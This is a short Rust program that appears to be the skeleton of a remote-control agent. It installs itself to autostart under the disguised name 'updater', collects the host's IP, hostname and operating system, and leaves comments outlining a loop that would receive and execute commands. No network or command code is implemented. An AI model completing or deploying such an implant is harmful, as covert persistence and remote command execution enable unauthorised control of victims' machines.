use std::{env, net::Ipv4Addr, str::FromStr};
use auto_launch::AutoLaunchBuilder;
use local_ip_address::local_ip;
use whoami::{fallible::{distro, hostname}, platform};

fn main() {
    let path = env::current_exe()
                        .unwrap()
                        .as_path()
                        .to_str()
                        .unwrap()
                        .to_owned();

    let auto = AutoLaunchBuilder::new()
        .set_app_name("updater")
        .set_app_path(&path)
        .set_use_launch_agent(true)
        .set_args(&["--minimized"])
        .build()
        .unwrap();

    // enable the autostart:
    if !auto.is_enabled().unwrap() {
        if auto.enable().is_ok() {
            // autostart was enabled
        }
    }

    loop {
        let internal_ip = local_ip().unwrap_or(std::net::IpAddr::V4(Ipv4Addr::from_str("127.0.0.1").unwrap())).to_string();
        let external_ip = "";
        let hostname = hostname().unwrap_or("UNKNOWN".to_owned());
        let operating_system = format!("{} - {}", platform(), distro().unwrap_or("UNKNOWN".to_owned()));
        // wait
        // send update
        // read command
        // verify signature and nonce
        // execute command
    }
}
